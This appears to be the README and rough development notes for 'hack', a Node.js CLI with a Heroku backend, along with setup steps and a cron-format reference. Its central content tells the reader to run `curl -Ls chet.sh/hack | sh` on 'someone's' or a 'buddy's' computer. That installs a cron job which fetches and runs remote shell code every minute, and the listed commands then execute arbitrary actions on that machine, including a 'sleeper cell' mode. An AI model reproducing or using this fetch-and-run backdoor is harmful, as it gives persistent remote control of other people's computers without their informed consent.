# Hack

## Getting Started

Clone, install, link:

```sh
git clone https://github.com/ccorcos/hack.git
cd hack
npm install
npm link
```

Setup Heroku:

```sh
brew install heroku-toolbelt
heroku login
heroku create hacker-chet
echo "ROOT_URL=$(heroku info -s | grep web-url | cut -d= -f2)" >> .env
```

Run locally:

```sh
npm start # alias for `heroku local web`
```

Deploy to Heroku:

```sh
npm run deploy # alias for `git push origin heroku`
```



- git push heroku master


- heroku ps:scale web=1
- heroku open


- heroku logs --tail


- heroku local web



- xo?


# To Do

- CLI should generate shell scripts with "HACK_URL" which will get injected by express based on the heroku config

-

xo and test


update without pushing / redeploying?

heroku config:set HEROKU_URL=$(heroku info -s | grep web-url | cut -d= -f2)


























Start hacking someone by running this command from their Terminal: `curl -Ls chet.sh/hack | sh`. That sets up a cron job every minute which pings `curl chet.sh/live | sh`.

Now go to your commandline and we can start having some fun.

```
hack live exec "say hello world"
hack live interval 1y # sleeper cell
hack live cron "20 16 * * * * say 'its foe 20, ye better be toke-in'"
hack live reset
hack live forget
hack live rename jon
hack jon ...
```

# FYI

http://www.nncron.ru/help/EN/working/cron-format.htm

```
* * * * *
| | | | |
| | | | |
| | | | +---- Day of the Week   (range: 1-7, 1 standing for Monday)
| | | +------ Month of the Year (range: 1-12)
| | +-------- Day of the Month  (range: 1-31)
| +---------- Hour              (range: 0-23)
+------------ Minute            (range: 0-59)
```

# PS

How to make a Node.js CLI app: http://blog.npmjs.org/post/118810260230/building-a-simple-command-line-tool-with-npm

# PPS

Bought the domain name `chet.sh` here: https://www.nic.sh/

# To Do

- demo
- better readme
- better help
- better command validation
- configure with custom domain name

# Getting Started

```sh
git clone ...
cd hack
npm install
npm link
```

On your buddy's computer, just need to run this:

```sh
curl -sL chet.sh/hack | sh
```
